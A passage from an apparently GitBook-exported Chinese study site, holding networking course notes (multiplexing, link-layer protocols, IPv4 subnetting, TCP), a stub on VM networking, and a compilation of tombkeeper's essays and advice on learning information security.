指明接口电缆各条信号线（电压范围）的作用 过程特性 指明每种功能的事件发生顺序 传输媒体的种类 信道复用技术 目的： 为了通过共享信道,最大限度提高信道利用率。 频分复用 用户同时占用不同的频带资源并行通信 时分复用 用户分时占用相同的频带资源并行通信 波分复用 与频分复用一样，只是传输数据的介质变为光波 码分复用 用户同时占用相同的频带进行通信 码片：每个比特时间划分为m个更短的时间片，称为码片（Chip） 某个站要发送比特1，则发送它自己的m比特码片序列 某个站要发送比特0，则发送它自己的m比特码片序列的反码。 码片向量 根据码片序列生成。1→1，0→-1 假设码片序列为110 则码片向量为（1，1，-1） 规格化内积 右式中的Ai，Bi指的是码片向量 生活中的例子 规格化内积得到（1，-1，1）对应的码片序列就是101，即手机A收到比特串101. 码元率与数据率 奈式准则得到最高码元速率（波特率）为20000码元/秒，码元的振幅分为16个等级，即信号状态数（可调制出的不同基本波形或码元数量）为16，则一个码元可携带的比特数量为log216=4，所以最高数据率为20000*4比特/秒。 奈式准则和香农公式 计算 极限信息传输速率==码元传输速率（波特率）*码元携带的比特数 码元携带的比特数：1og2n //n为码元的振幅或者信号状态数（可调制出的不同基本波形或码元数量） 频率＝传播速率/波长 频带宽度=最高频率-最低频率 第三章16.数据率为10Mb/s的以太网在物理媒体上的码元传输速率是多少码元/秒？ 答：码元传输速率即为波特率，以太网使用曼彻斯特编码，这就意味着发送的每一位都有两个信号周期（一个码元携带0.5个比特），因此波特率是数据率的两倍，即20M码元/秒 第三章 数据链路层 目的 数据链路层做成可靠的链路层有哪些优点和缺点。 可靠的链路层的优点和缺点取决于所应用的环境：对于干扰严重的信道，可靠的链路层可以将重传范围约束在局部链路，防止全网络的传输效率受损；对于优质信道，采用可靠的链路层会增大资源开销，影响传输效率。 透明传输 添加帧首部和帧尾部：帧定界符，为了区分比特流中的帧 区分载荷中的数据与帧定界符和控制符：ESC（控制符）+FLAG（帧定界符） 字符填充法：在字符前加上转义字符ESC（11100000） 零比特填充法：每五个连续比特1后面插入一个比特0 差错控制 目的：为了检测比特在传输过程中是否产生误码（比特差错）。 如何检测： 奇偶校验 CRC（循环冗余校验） 可靠传输 保证接收方能够正确收到发送方发送的所有数据。· 传输中出现的差错 误码：比特错误。 丢失：路由器的输入队列满时，会主动丢弃数据分组，亦或是接收方收到了重复的数据分组时。 乱序：数据分组通过不同的路由路径，导致到达接收方的时间不同。 重复：数据分组通过的路由路径堵塞，导致发送方没有及时收到确认分组，亦或是确认分组在传输的过程 中丢失，发送方就会超时重发。 机制 否认机制：当接收方收到数据并进行差错检测后，如果发现出现数据误码，就向发送方发送否认分组，以让发送方重发数据。 超时重发机制：发送方发送数据后，就开始计时RTO，如果超过RTO时间还没有接收到确认/否认分组，就自动重发对应的数据分组。 滑动窗口机制：发送窗口和接收窗口的大小决定了一次能够发送或接收数据分组的最大数量，并且只有成功发送或接收窗口大小的数据分组，才能够滑动窗口，即才能够发送或接收下一次的数据分组。 传输协议 停止-等待传输协议 使用超时重发机制，每次只发送一个数据分组。 并使用1bit来标记分组序号来防止数据重复差错。 回退N帧协议 使用滑动窗口机制。 发送方发送数据分组的个数取决于发送窗口的大小。 接收方接收数据分组的个数默认为1，即接收窗口的大小默认为1。 假设传输数据0，1，2，3，4，数据分组2出错， 那么发送方就要回退到第2帧，重新发送数据分组2，3，4。 选择重传协议 使用滑动窗口机制。 发送窗口和接收窗口大小一致。 假设传输数据0，1，2，3，4，数据分组2出错， 那么发送方只需要重新发送数据分组2。 ​ 以太网 集线器共享式以太网 交换机交换式以太网 交换机自学习 A→B 从A发出的帧到达交换机后，交换记录下该帧的源MAC地址即主机A的MAC地址和帧到达的交换机接口，并在交换机的记录表中查找帧中的目的MAC地址，从而精确转发或者盲目转发。 集线器，交换机与带宽 https://blog.csdn.net/grady1234/article/details/44804423 集线器是”共享总线“，只有一条车道，一般是各主机平分带宽。 交换机是一条公路，有N条车道（取决于交换机的端口数量），所以各主机是独享带宽。 但是当只有一个车道是可以访问外网时，访问外网时又会变为各主机平分带宽。 PPP--宽带连接 帧格式 透明传输 PPP协议的主要特点是什么？为什么PPP不使用帧的编号？PPP适用于什么情况？为什么PPP协议不能使数据链路层实现可靠传输？ 答： 简单，提供不可靠的数据报服务，检错，无纠错; PPP不采用序号和确认机制是出于以下的考虑： 第一， 若使用能够实现可靠传输的数据链路层协议，开销就要增大。在数据链路层出现差错的概率不大时，使用比较简单的PPP协议较为合理。 第二，数据链路层的可靠传输并不能保证网络层的传输也是可靠的。 第三， PPP协议有帧检验序列FCS字段，可以检错，所以可以保证无差错接受。 PPP适用于点到点线路并且线路质量不差的传输中，例如用户拨号连接上网。 因为PPP不使用序号和确认机制，所以无法实现可靠传输。 第四章 网络数量=2^网络号 可分配地址=2^主机号-2 分类编址 IP地址=网络号+主机号 可分配给主机的地址=2^x-2 （x为主机号位数；-2：网络地址+广播地址） A类地址 ​ 本地环回地址：通常是指127.0.0.1，不属于任何一个有类别地址类。一般都会用来检查本地网络协议、基本数据接 口等是否正常的。 ​ 本地环回地址详解及与localhost，0.0.0.0区别 总结 127.0.0.1 是回环地址。localhost是域名，但默认等于 127.0.0.1。 ping 回环地址和 ping 本机地址，是一样的，走的是lo0 \"假网卡\"，都会经过网络层和数据链路层等逻辑，最后在快要出网卡前狠狠拐了个弯， 将数据插入到一个链表后就软中断通知 ksoftirqd 来进行收数据的逻辑，压根就不出网络。所以断网了也能 ping 通回环地址。 如果服务器 listen 的是 0.0.0.0，那么此时用127.0.0.1和本机地址都可以访问到服务。、 B类地址 C类地址 D类和E类 例子 特殊ipv4地址 划分子网 IP地址=网络号+子网号+主机号 网络地址=网络号+子网号 网络地址=IP地址&子网掩码（因为子网掩码的主机号全0，所以&运算后的结果只保留了网络号和子网号。） 由来 当局域网从只有一个子网1到拥有三个子网时： 通过借助主机号的比特来区分子网。 但是有一个问题就是如何知道主机号中的哪些比特是用来区分子网的？ 所以出现了子网掩码 注：这时候的 ​ ​ 例子 ​ 划分出的子网数量为2^1=2个 （1为子网号位数） 无分类编址--CIDR 定义 斜线记法 星号记法 ​ 网络前缀的后面加一个星号 的表示方法，如00001010 00，在星号 之前是网络前缀，而星号 表示 IP 地址中的主机号，可以是任意值。 好处 ​ ​ 动态分配地址，有效利用ipv4地址 ​ 分配网络前缀时应先分配地址数较多的前缀。 ​ ​ 减少路由信息所占的网络资源，原本需要记录5个路由信息，使用无分类编址只需要记录其共同前缀作为网络地址即可得到聚合地址块。 子网划分 定长子网掩码 不定长子网掩码 先根据主机数量+网络设备数量确定出主机号，从而确立出子网掩码。 ip地址与mac地址 为什么需要两个地址，如果只有一个地址可以吗？ 不可以。因为如果只有mac地址，那么路由器就需要记录所有主机的mac地址，这需要巨大的路由存储空间以及通信资源。而如果只有ip地址，那么数据就不能到达目的主机，因为只知道主机在哪一个网络理里，而不知道主机具体在网络的哪里，ip地址就像小区号，mac地址就像门牌号，只知道小区号是找不到对方的。 ip数据报 发送过程 主机A向主机B发送IP数据包 主机A需要判断主机B与其是否在同一个网络中，若在同一个网络中可以直接交付，若不在同一个网络中，则需要路由器来间接交付。 假设是间接交付。那么主机A该将IP数据报发给哪一个路由器呢？答案是默认网关，即网络管理员设置的主机A所在以太网用来转发的默认路由器。 主机A将IP数据报转发给默认网关后，网关（即路由器）怎么知道该转发给哪个以太网呢？答案是根据路由表。 网关将IP数据报的目标地址（即主机B的IP地址）与路由表中的子网掩码相与后得到主机B的网络地址，再查找路由表中是否有该目的网络，如果找到就按照下一跳将IP数据报转发出去。 格式 VPN--虚拟专用网 NAT--网络地址转换 内网转外网 内网转端口 IPV6 第五章 端口号 UDP和TCP数据报格式 TCP连接 序号：指的是发送的数据载荷的第一个字节的序号。 确认号：指的是已经成功接受到序号至（确认号-1）的数据，希望对方发送的数据是从确认号开始的。 ACK：1表示成功接收，只有设置为1，确认号才是有效的。 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:37:26 "},"07.基础知识/计算机网络/虚拟机网络.html":{"url":"07.基础知识/计算机网络/虚拟机网络.html","title":"虚拟机网络","keywords":"","body":"https://wxler.github.io/2021/02/02/221724/ VM网络配置 虚拟机win10打印的网络配置信息 宿主机网络设备 NAT模式 桥接模式 仅主机模式 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:37:30 "},"07.基础知识/tombkeeper关于信息安全学习的分享.html":{"url":"07.基础知识/tombkeeper关于信息安全学习的分享.html","title":"tombkeeper关于信息安全学习的分享","keywords":"","body":"前言 这是我整理的tombkeeper关于信息安全学习研究相关的经验聚合文章。 以下内容均来自tombkeeper的微博或知乎。 如何做事（编者加） 中国每年大概有五百万理工科毕业生。其中堪称优秀技术人才的自然是少数。然而，技术好又会做事的更是极少数。 什么是“做事”？就是确立目标、分析路径、规划资源、制定方案、迭代执行。优秀技术人才，自然是能把技术做好的人。但从做技术到做事，中间还有很远的距离。大部分人可能终其一生都不会做事。 前阵子一个同学跟我说想去BlackHat演讲。我说你是怎么规划这件事的？他一愣，半天说不出话。他定了目标，但没去想后面的事情。 然后我问他有没有注意到BlackHat有些演讲水平很高，但也有一些不太行的。他说确实是这样。然后我说你有没有分析过为什么会这样？他说没有。我说如果你分析一下那些不太行的演讲为什么也能上BlackHat，是不是会对你达成目标有帮助？他恍然大悟。 我说这只是一个小点，还不算完。你知道怎么才能上BlackHat？他想了一下说是投稿被接受。我说那么是不是应该收集既往演讲的内容摘要，分析被接受的投稿有什么特点。 然后我说你有没有想过BlackHat演讲者和主办方之间是什么关系？他说不知道。我说本质是商业合作关系。主办方给演讲者提供曝光机会和机票酒店，演讲者用自己的内容帮主办方把票卖出去。所以投稿要让别人看了觉得是有利于卖票的。 我又问你有没有想过Review Board里的人是怎么挑选演讲的？有没有想过如果你在Review Board你会看重哪些？有没有了解过Review Board里的那些人？其中和你技术方向相关的人有哪些？这些人历史上做过什么？他们可能会对哪些东西更青睐？ 说了这么多，还只是分析路径这一步。后面规划资源、制定方案、迭代执行都还需要更多的思考。当然，这个同学刚毕业，不会做事很正常，后面还有时间慢慢学。但如果你毕业已经很久了，发现自己还不会做事，就要开始留心培养这方面的能力了。在学校里我们的成长主要靠学习知识。毕业后，更重要的成长是学会做事。 大学专业选择（编者加） 前阵子一个朋友忽然说要谢我，感谢我当初在他儿子考大学选专业时给的建议。我都不太记得这事了，想了好一会才回忆起来。 这个朋友一直觉得我们实验室特别好，所以 2019 年他表弟还在读大四的时候，他就想让表弟跟我学网络安全。我当时看了他表弟的简历，说这孩子将来的前途必然在 AI 上，没必要强行来搞安全。 几年后，这位朋友告诉我，他表弟读研究生了，方向就是 AI。后来他又告诉我，他表弟已经是学校人工智能实验室事实上的负责人了。而且他表弟在听说了我的遍历文档的学习方法后，也用到了对 AI 的研究上。不光自己这么做，还要求实验室的同学都这样。据说效果出乎意料地好。 前两年他儿子要考大学了，他来问我应该报什么专业。他当时还是想让儿子将来搞网络安全，于是问我是读网络安全专业还是读计算机专业。 我说将来干什么还得看兴趣，孩子未必就喜欢网络安全。听了他儿子的情况后，我建议他让儿子本科学数学。我说数学底子打好了，如果愿意搞网络安全，我可以教他怎么学。而如果喜欢搞别的，比如 AI，那么数学底子好也很有优势，别的都可以自学。 于是他就听我的建议让儿子读了数学系。最近他儿子去和他表弟学 AI，学的特别快，一下体现出数学底子好的优势。他很惊喜，所以特别来谢我。 刚才仔细回忆了一下这几年的事情，感觉我就是他家的定制版张雪峰。 遍历文档学习法 2005.10.02 这两天论坛上又有人开始抱怨世风日下，大家都现实了，都不开放了，不交流了。对这种“月经贴”，我基本上已经习惯了，不过因为吃了粉皮炖鸡，心情比较好，于是就说了两句。 三四年前，当时我对人性的看法还不像现在这样。有几个人加了我的QQ，说想学Windows，我居然就好为人师起来，自不量力地教人学Windows。我很天真地把自己的经验告诉他们： 一、先把Windows的帮助文件从头到尾看一遍。 二、在Windows目录下搜索.txt、.htm?、.log、.ini，把每一个文件内容都看一遍。 三、把注册表浏览一遍。 没有诀窍，也不用花钱买书。任何人把这三步做完之后，只要不是傻子，在Windows应用方面都可以非常熟练。并且如果想进一步学，也自然知道应该去看什么了。 结果甚至没有一个人能看完Windows帮助文件，看完三分之一的都没有，都说看不下去。我很奇怪，我看Windows的帮助文件就像看金庸小说一样愉快，怎么会有人觉得辛苦？ 后来我想明白了：因为我爱她，而他们不爱她，只是想占有她而已。 他们要的不是交流，不是开放，甚至也不是想找个人“拜师”，他们想要的不是郭靖遇到的洪七公，而是虚竹遇到的无涯子。 再后来，一个偶然的机会，我看到了小四同学写的那篇《你尽力了么？》，才知道原来这不只是我一个人的看法。 这两天在家，在笔记本上折腾Linux，遇到了很多问题，我就把内核每一个编译选项的说明都细细看了一遍，反复编译上二十多遍——然后，所有问题的答案都找到了。显然，学Linux和学Windows的方法并没有什么不同。 为什么很多高中生都能比大学生强 前几天一个老朋友找我，他需要找一个某方向的技术合作伙伴。这个方向需要对操作系统达到专家级的熟悉程度，做起来并不容易。我认识的能做这个的人都已经在大公司里有很好的职位了，于是我给他介绍了一个相关的开源项目。他联系了那个开源项目的作者，想拉他入伙。结果发现作者今年九月刚上大一，代码是高中时写的。 任何领域，是否能学有所成，除了天分原因外，还需要： 能接触到所需的学习资源 投入了足够的时间精力 文科的学习资源主要是书，相对容易获取，所以我们可以看到很多自学成才的作家。但多数理工科的重要学习资源都不太容易获取。比如你想学生物，就很难在家建立起实验室。 计算机领域（不止信息安全）是个例外。只需要有一台能联网的计算机，就可以学很多东西。那么这时候就主要看是否投入了足够的时间精力。 你们可以回忆一下自己的大学生涯，身边有多少人每天能投入 12 个小时在学习上？投入 8 小时的有多少？哪怕投入 4 小时的有多少？四年下来读了多少行代码？写了多少行代码？ 所以被热爱技术、投入很多时间学习的高中生超过有什么奇怪的。 想读某个导师的博士应该如何与之沟通 有个学电子工程的同学想去读一个网络安全方向导师的博士，问我该怎么找那个导师说。这类情况，我建议先把导师团队过去几年做的东西都看看，再把其他相关研究者的工作也看看。然后对这个方向进行一些思考，争取能有点自己的想法。然后再去找那个导师聊聊自己对安全的热爱，和对相关领域的学习和理解。 学习网络安全的最佳路线是什么 “怎么学XX”这样的问题，有点类似问路。别人只能给你指个方向。但多数人想要的都是 GPS，给他规划好详细路线，到哪儿该变道，实时路况怎么样。多学一点额外的东西，就感觉自己吃亏了。 “从西直门到天安门怎么走？” “坐地铁二号线到复兴门再转一号线。” “我看地图这样是走了一个直角，感觉绕远了。有没有直接去的路？” “有啊，你飞过去。别飞太高，不然起飞降落要多花不少力气。” 如何才能系统地学习逆向 我也是先学WEB后学逆向的。从我的经验看，首先应该抛弃“系统的学习”这个想法。因为逆向需要用人的自然语言逻辑去适应程序的机器指令逻辑，痛苦指数比较高。要拮抗这个痛苦，需要持续有正反馈。但“系统的学习”相对难以持续提供正反馈。 所以比较好的方式是给自己找一些难度中等，又比较有意思的目标来入手，比如给 notepad.exe 的菜单里增加一个功能。在这个入手过程中，先不用想系统不系统的问题，搞到哪儿算哪儿。入手之后，完成了最痛苦的那个门槛翻越，后面就和学别的差不多了。 大学培养计划的问题 最近几年帮一些大学的网络安全专业评审过几次人才培养计划，本硕博都有。感觉存在一些共性问题。 其中一个是部分学校的网络安全专业本科课程没有数电和模电。软工不开数电模电也就算了，但网安专业在未来的工作中可能需要面对从芯片、信号到代码、数据的各种问题，真的还是需要学这两门课的。尤其是在当前的技术发展形势下。 当然，如果本科没有这两门课，研究生阶段如果是硬件安全或无线安全的方向，再来学这两门课也不是不可以。但这就要求本硕培养计划能衔接上。而且我看到一般硕士培养计划里似乎也没有考虑这个问题。 行业观察（编者加） 每当网络安全行业发展陷入停滞，行业里的第一阶级就会新造一个词。然后第二阶级打开文档，用新词进行查找替换。第三阶级则开始思考拿什么产品改一改能贴上这个新词。 在重复的工作中有所收获（编者加） 我刚参加工作的时候，做了很长一段时间“低级”“无意义”的工作。就是给 IDS 加一些针对古老攻击工具的规则。 那些木马和漏洞有些甚至古老到连运行环境都不好找了。所以加那些规则对检测能力来说确实没有意义，永远都不会发挥作用。但竞争对手有这个规则你就也得有。你看，其实连网络安全产品也是“内卷”的。 工作的步骤就是搜索、下载、运行、抓包、看特征、写规则。然后再重复，再重复，重复很多遍。有时候为了应付一个投标前的测评，每天要加接近一百条规则。就这么重复，干到十一二点。 但通过做这些重复的、“低级”的、“无意义”的工作，我熟悉了各类漏洞的原理，学会了很多分析工具的使用，熟悉了大量通用的和私有的网络协议，看到了各种系统可能出问题的地方。如果 2002 年没有做过这些“低级”“无意义”的工作，我大概也不会对网络协议有那么深刻的理解，不会在 2016 年发现 BadTunnel 漏洞。 当然，如果只是机械地去重复工作过程，而不在工作中学习和思考，那不管做什么工作，都不会有长进。对这类人来说，工作确实只是消耗过程，而不能成为增益过程。 一个女生怎样才能进入腾讯的玄武实验室？ 『本人是一位热爱网络安全技术的女生，大二开始接触网络安全，因为热爱，大部分时间都在自学网络安全方面的知识技能，有学习主动信息收集，被动信息收集，无线攻击，密码破解，web渗透,metasploit,linux等渗透测试所需技能，正学习python。不断地学习中发现，可能因为网络安全涉及面较广，所以需要掌握的知识较多但不深，而心中有大牛的目标，向往玄武这种顶级的国内安全研究实验室，查看各种资料发现玄武对技术的要求非常专一且深入，再加上玄武好像只有一位女生，有些迷茫不知朝哪个方向努力，才能离玄武更近一步。』 很多人以为我是专门研究二进制安全的，所以偏向二进制方向。其实去年发现的 BadTunnel 就不属于二进制方向：《BadTunnel：跨网段劫持广播协议》BadTunnel：跨网段劫持广播协议。你上面提到的东西，我基本也都搞过。 这是很早以前一份简历里的内容： 2002年1月，发现了CheckPoint MetaInfo Sendmail管理接口执行命令漏洞。 2002年1月，发现了Snitz Forums 2000 Version 3.1 SR4的管理界面认证绕过漏洞。 2002年4月，和一个朋友共同发现了PhpBB等多个论坛程序的BBCode函数拒绝服务漏洞（bugtraq ID 4432、4434） 前几年研究浏览器的二进制漏洞时也同时研究过 Web 前端相关的问题：《浏览器和本地域》网页链接 你说的无线攻击我也研究过：《来自空中的威胁》网页链接 渗透测试做的就更多了。以前在乙方公司，我是渗透测试主力。还记得最忙的一个项目，我和部门领导一起，两个月做了 184 台服务器的渗透测试。 所以我可能是最不会对各类安全技术有偏见的人。 无论哪类技术，背后的需要的东西都是类似的。AFL 这个革命性的二进制漏洞 Fuzz 工具的作者，也是《The Tangled Web: A Guide to Securing Modern Web Applications》这本 Web 安全圣经的作者。 我们实验室有几个做 Windows 方向的同学， 毕业前都没接触过 Windows 安全。但在实验室工作半年后，就开始能做出一些成果。一年多之后，就已经能做出很不错的东西。当然，这并不意味着干这行很容易，人人可为。这几位同学虽然之前没接触过 Windows 安全，但在校期间，在其它方向上都做出了一些东西。我记得其中一个同学，毕业前硬啃了几个月 Apache 源码，发现了一个漏洞。在 Apache 里还能搞出东西来，是不容易的。 工作并不意味着学习的结束，而是另一个开始。我们大多数人至少都要工作三十年，这三十年里还会有很多东西要学。所以不用太在意之前学了什么，更重要的是看你还能学会什么。无论之前学过什么，将来都要再学新东西。无论之前学的是什么，将来也都会有用。艺无止境，功不唐捐。 答一位热爱网络安全的同学的来信 谢谢对玄武实验室的关注和对我的信任。 实验室对实习同学的要求，其实主要就两点： 对信息安全有比较整体的认识； 至少钻研过一两项工业界的技术，有深入的了解和一定的成果。 读了来信，我感觉你是一个勤奋好学的人，这很难得。大学时代是最适合学习的时候——这听起来有点像废话，但在这段时间里，你有很多时间，而没有生存压力，你的记忆力处于一生中的巅峰状态，你即使一夜不睡也可以很快恢复精力。毕业后可能再也不会有同时具备这些条件的时间了。 有了勤奋，接下来主要是在什么方向上勤奋的问题。 技术可以分为学术界和工业界，这两者都有意义，互有交叉，但其实区别也很大。企业需要的技术主要是工业界的技术，而在学校的环境里，不少人学术上不错，但对工业界的方向和需求了解比较少。前阵子有位高校的青年教师给我写信，谈了他做的研究。我发现他的技术很好，但做过的东西离工业界比较远。北美华人安全学术界的宋晓东（Dawn Song）教授、蒋旭宪（XuxianJiang）教授都是把学术和应用结合的比较好的代表。你们可以读一读他们的研究，体会一下。 还有一个比较好的方法是阅读工业界安全会议的资料。从这些资料中也许学不到什么技术细节，但可以看看大家在做些什么，哪些自己比较感兴趣，然后选一两个方向，寻找相关资料深入学习。 信息安全走向漫谈 村长airsupply#[0x557.org](http://0x557.org/)邀我来B105沙龙和大家闲扯。而我近来的工作是拉磨居多，接客其次，实在没有什么新货。村长说：不必讲技术，可以谈谈“信息安全的现状和未来”。我思前想后，觉得这个题目纲领性太强，我这点资历讲起来显然自不量力。还是改称“信息安全走向漫谈”显得比较低调。漫谈漫谈，就是漫天乱谈，谈错了不要紧。万一谈得对，就算蒙上了。 1. 学什么技术不会过时？ 常有人跟我发牢骚，说搞技术太累，总要学新东西。还总问，安全技术未来的方向是什么，学什么技术不会过时，五年十年之后还能混饭？ 每到这时我都很尴尬，不知道应该说什么。 有些朋友知道，我读了五年医科大学。很多人认为医生是一个稳定的职业，医学是保值的知识，学完了就可以躺在上面吃一辈子。其实恰恰相反。稍大一点的医院都有自己的图书馆。年轻医生就不用说了，很多六十多岁的老医生上门诊，抽屉里还放着一本专业书，有病人的时候就给人看病，没病人就拉开抽屉看书。以前儿科的老主任对我说过：干医生这一行，半个月不去图书馆读文献，就落后了。毛主席说“三天不学习，赶不上刘少奇。”医生这一行就是这样。 我们家乡有句俗话，叫“看别人吃豆腐觉得牙齿快”。很多技术人员都觉得销售这个活儿好干，工作就是吃喝玩乐混关系，挣钱又多，还不费脑子。我只能说“那你去试试看吧”。先甭说销售绝对不是不费脑子的活儿，也绝对不是光靠“吃喝玩乐混关系”就行的。就算是，这“吃喝玩乐混关系”七个字岂是简单的？谁刚从台上下来满怀落寞但还有一些重要关系？谁虽然只是个普通教授但是诸多弟子都身居要职？谁手里有指标但自己不能完全做主？谁行政级别高但没有实权？新上来一把手是爱人民币爱高尔夫爱燕鲍翅还是爱制服捆绑？京城里何处灯最红何处酒最绿？——这些信息都是动态的，变化的，而且靠订阅邮件列表和看BBS是得不到的。不收集，不学习，咋整？ 公交车站牌上贴的那些招聘职位，没有学历要求，只要“形象好，气质佳，思想开放”就可以“日薪1500以上”，这个钱挣起来算是容易又轻松了吧？其实即便从事这种地球上最古老的职业，学和不学那也是大大不同。苏小小、李师师的时代，要上头牌都得会琴棋书画，填词唱曲。到了十里洋场上海滩，根据才情高低也要分出“书寓”、“长三”、“幺二”来，啥都不会就只能混“野鸡堂子”。现在没那么多讲究了，不过“一剑穿心毒龙钻，冰火红绳空中飞”这些基本业务总还得学，要不然也还是“野鸡堂子”、Street-Walker的命。 那究竟有没有什么是学了不会过时的呢？学会学习的方法，学会从学习中获得快乐，这是永不过时的。如果享受不了汲取知识的快乐，那就不适合做任何需要脑力的工作。 2. 信息安全的未来如何？ 最近一两年，大家感觉信息安全形势比前两年要好些了，不再像2002、2003年的时候，漏洞满天飞，蠕虫遍地爬。于是有人开始担心：漏洞少了的确有利于信息安全，但这样下去，最终会不会导致我们失业？ 对此我是这样看的：信息安全技术的发展将来一定会有技术方向上的变化，但不会有前途上的问题。 电影《笑傲江湖》中任我行说：“有人就有江湖 ”。从有马帮的那一天起，就有马贼；从有海船的那一天起，就有海盗。有盗贼怎么办？理论上靠官府，实际上靠自己。自己搞不定怎么办？花钱找镖局。几千年来，什么时候这个格局改变过？过去镖局保的是金银，今天我们保的，归根结底也还是金银。从这个意义上讲，我们这个行业其实是镖局发展进入信息时代后，出现前面说的“技术方向上的变化”，而化生出来的。 所以，只要人类社会还存在信息交换行为，只要这些信息交换涉及到利益，就会有人试图改变这些利益的分配规则，就会有对信息安全的需求。百川归大海，这是一个根本法则，不管中间怎么九曲十八弯，最终，这个根本法则是不会有什么变化的。 大家感觉信息安全形势比前两年要好，可能一个主要原因就是看到软硬件厂商对安全越来越重视，安全措施越来越多。而看起来，比较严重的安全漏洞似乎有减少的趋势。互联网上几乎每台机器都有防火墙保护。新的Fedora Core默认开启了Linux的很多安全特性，而且看起来以后会一直这样下去。微软将要发布的Vista也似乎是一个强健无比的系统。这一切仿佛都在暗示信息安全会成为一个历史阶段性的事物，随着安全形势的进一步好转，这个行业也会逐渐淡去。 下面我们具体来谈谈这些问题。 Vista是个纸老虎 很多搞Windows安全的人最近都着实被微软的Vista给吓着了，觉得以后Windows就安全了，没什么可搞了。微软号称这个系统比前代大大增强了安全性。不过大家别忘了，微软推出Windows 2000的时候是这么宣传的，推出Windows XP的时候是这么宣传的，推出Windows 2003的时候也是这么宣传的。 当然，实事求是地说，从我们最近一段时间对Vista Beta版的研究来看，这个新系统的确采取了很多新的安全特性，大大增加了传统漏洞的利用难度；新的开发过程和开发工具也的确降低了漏洞发生的几率，比起之前的产品在安全上可以说有一个大飞跃。 但关键问题是：人们真的会接受这样一个用大量确认窗口和限制措施来虐待用户的操作系统么？更别提可怕的资源占用和乌龟般的速度了。至少我是绝对不会用这个东西的。估计在Vista正式上市后，各种Windows优化软件肯定会立即提供关闭这些安全特性的功能。 信息安全，信息为肉，安全为骨。肉无骨则不立，骨无肉则不活。蚯蚓之类，只有肉没有骨，尚可以慢慢蠕动，可以不太精彩地活下去；但是没有肉，光剩骨头，什么动物也活不了。安全措施对用户的扰动越小，就越容易被接受。时刻发挥作用，却几乎感觉不到它的存在，这就是安全工作的至善境界，也是最难达到的目标。要不然为什么杜雷斯的超薄型卖得贵还那么受欢迎。 在我看来，Vista就是个至少一厘米厚的杜雷斯。 任何企业的目标都是挣钱，只有当维护用户安全和挣钱这个目标恰好吻合时，它就会设法增强用户安全，如果维护用户安全影响了挣钱这个目标，它一定会考虑重新调整两边的砝码。 今天我在这里关起门来做个大胆的预言：Vista终将成为一个类似Windows ME那样没什么人愿意用的失败产品。微软甚至可能会在Vista后续的Service Pack或者下一代操作系统中取消或者减弱一些影响用户体验的强制安全特性。 另外，这个一厘米厚的杜雷斯是否真的就比0.03mm的超薄型安全333.33倍？值得怀疑。Windows 95只有1500万行代码，Windows 98有1800万行代码，Windows XP 有3500万行。Vista 则有5000万行，比XP多出了40%。新代码带来新功能，同样，新代码也必然会引入新漏洞。 毛主席说过，“一切反动派都是纸老虎。看起来，反动派的样子是可怕的，但是实际上并没有什么了不起的力量。从长远的观点看问题，真正强大的力量不是属于反动派，而是属于人民。”在我看来，Vista也很可能是个纸老虎。假以时日，纸老虎的软裆必然会被一一发现。 退一步讲，即便Vista、Fedora Core等为代表的新一拨操作系统真的是一个漏洞都没有了，从整体上看，信息安全态势仍然不乐观。 未来，各行各业各领域都将数字化，生活的方方面面都离不开信息技术。各种不同的信息技术交织在一起，构成巨大的宏信息世界，比我们现在的互联网大得多，复杂得多。安全问题也会随之复杂和严重。现在个人电脑上那一点点漏洞到那时候看就很渺小了。想想看，以前是你的电脑被入侵，以后你的电饭锅被入侵；过去是让你上网慢，以后让你吃夹生饭。 既然这样，为什么我们还要用信息技术呢？这一页PPT的标题叫做“信息技术是个狐狸精”。狐狸精，大家知道是什么吧，就是你知道她可能会害你，但身不由己。为什么呢？还是因为好，足够好到让你愿意冒这个险。 上高中时候，学摄影，用胶片，大夏天也要自己闷在暗房里冲洗。现在都是数码相机，随拍随看，多么方便。上大学的时候，大家都用“Walk-Man”，阔气一点的听随身CD、MD。现在一个火柴盒大小的MP3就都搞定了，价钱也便宜。 我在网上买过一个二手CF卡。拿回来，用数据恢复软件一看，里面有几张刑事案件的现场照片，血迹斑斑。还拍了受害人。这个卡不知道是哪个派出所淘汰下来的。如果追究起来，肯定要有人受到不好的影响。这种事情，在用胶片的时代不会有。但今天，新问题就出现了。 这些是什么啊？是狐狸精。狐狸精太好了，你很难舍弃。但糖衣好吃，炮弹难挡。信息技术发展的这么快，配套的安全很难跟得上。大家想想，汽车发明多少年后才有的安全带、安全气囊？有了安全带、安全气囊，每年还要车祸死多少人？每年车祸死这么多人，大家是不是还一样开车？这就是狐狸精，死都离不开。 今年世界杯，就有人提出，要在每个球员身上装RFID，对球员进行实时精确定位，用来作为裁判的辅助依据。虽然最后没有这么干，但这一天迟早会到来（注：后来才知道，马拉松比赛已经开始用RFID来跟踪选手的位置）。 （此处省略几页对RFID安全问题科普讲解的PPT内容） 刚才讲的比较科幻。落到现实中来，你我能看到的未来若干年中，可能的新热点有：Wi-Fi、蓝牙、WiMax、UWB等无线通信技术的安全问题，RFID的安全问题，消费类个人电子产品的安全问题，数字家电的安全问题，等等。 人类社会用信息技术越多，意味着越多的的财富和荣誉将由数字介质承载，越多的风险将是信息安全风险，信息安全技术就越重要，这个职业就越重要。 现在国外有种职业叫保安顾问，保障你现实世界的安全。有为企业服务的，也有为个人服务的。我瞎猜一下：在未来，可能要有类似这样的信息安全顾问。而且可能比较普及，就像现在国外的私人医生、私人律师一样。 退一万步说：信息安全企业也许会消失，但信息安全这个职业永远不会消失——只要人类还使用信息技术。 谢谢大家。 安全研究者的个人成长 个人成长 确立个人方向，结合工作内容，找出对应短板 该领域主要专家们的工作是否都了解？ 相关网络协议、文件格式是否熟悉？ 相关的技术和主要工具是否看过、用过？ 阅读只是学习过程的起点，不能止于阅读 工具的每个参数每个菜单都要看、要试 学习网络协议要实际抓包分析，学习文件格式要读代码实现 学习老漏洞一定要调试，搞懂别人代码每一个字节的意义，之后要完全自己重写一个Exploit 细节、细节、细节，刨根问底 建立学习参考目标 短期参考什么？比自己优秀的同龄人 阅读他们的文章和其他工作成果，从细节中观察他们的学习方式和工作方式 中期参考什么？你的方向上的业内专家 了解他们的成长轨迹，跟踪他们关注的内容 长期参考什么？业内老牌企业和先锋企业 把握行业发展、技术趋势，为未来做积累 推荐的学习方式 以工具为线索 一个比较省事的学习目录：Kali Linux 学习思路，以Metasploit为例： 遍历每个子目录，除了Exploit里面还有什么？ 